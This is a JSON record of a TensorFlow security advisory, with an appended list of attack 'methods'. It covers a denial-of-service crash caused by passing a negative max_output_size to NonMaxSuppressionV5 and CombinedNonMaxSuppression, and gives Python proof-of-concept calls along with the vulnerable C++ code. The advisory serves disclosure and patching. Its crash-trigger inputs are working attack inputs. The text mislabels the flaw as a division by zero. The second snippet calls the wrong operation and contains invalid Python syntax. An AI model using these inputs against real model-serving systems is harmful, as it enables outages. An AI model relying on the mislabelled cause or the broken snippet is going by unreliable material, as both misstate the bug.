{"description": "### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  // ...\n  std::vector<int> selected;\n  // ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    // ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.", "methods": ["Triggering a division by 0 in `tf.raw_ops.NonMaxSuppressionV5` by supplying a negative value for the `max_output_size` argument.", "Implicit conversion of an integer to an unsigned value, leading to a crash.", "Use of a user-controlled argument to resize a `std::vector` in the `NonMaxSuppressionV5` and `CombinedNonMaxSuppression` functions."]}
